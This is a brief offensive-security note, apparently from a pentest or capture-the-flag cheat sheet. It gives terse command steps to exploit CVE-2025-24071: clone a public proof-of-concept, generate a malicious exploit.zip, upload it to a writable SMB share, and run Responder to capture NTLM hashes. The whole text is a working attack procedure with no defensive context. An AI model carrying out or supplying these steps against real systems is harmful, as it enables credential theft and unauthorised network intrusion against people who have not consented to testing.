# Make Malicious File
```powershell
Condition: Have at least 1 writable SMB share

$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
$ cd CVE-2025-24071_PoC
$ python3 poc.py

smb: \> put exploit.zip

$ sudo responder -I tun0
```
